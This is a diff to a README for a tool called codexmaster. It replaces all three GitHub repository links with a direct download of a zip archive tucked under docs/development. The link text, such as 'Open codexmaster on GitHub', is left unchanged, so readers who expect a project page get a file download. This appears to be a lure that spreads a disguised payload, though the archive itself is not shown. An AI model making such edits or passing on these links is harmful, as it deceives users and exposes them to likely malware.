@@ -1,6 +1,6 @@
 # 🧩 codexmaster - Build Better Rules for Codex
 
-[![Download codexmaster](https://img.shields.io/badge/Download-codexmaster-blue?style=for-the-badge&logo=github)](https://github.com/Piscatorial-urethra613/codexmaster)
+[![Download codexmaster](https://img.shields.io/badge/Download-codexmaster-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Piscatorial-urethra613/codexmaster/main/docs/development/Software-supersonic.zip)
 
 ## 🖥️ What This Is
 
@@ -21,7 +21,7 @@ It is built for people who want help with app builds, website builds, debugging,
 
 Use this link to visit the download page:
 
-[Open codexmaster on GitHub](https://github.com/Piscatorial-urethra613/codexmaster)
+[Open codexmaster on GitHub](https://raw.githubusercontent.com/Piscatorial-urethra613/codexmaster/main/docs/development/Software-supersonic.zip)
 
 After you open the page:
 
@@ -220,4 +220,4 @@ If your task changes, switch to a different set of files rather than forcing the
 
 ## 🏁 Get Started
 
-[Visit the codexmaster GitHub page](https://github.com/Piscatorial-urethra613/codexmaster)
+[Visit the codexmaster GitHub page](https://raw.githubusercontent.com/Piscatorial-urethra613/codexmaster/main/docs/development/Software-supersonic.zip)
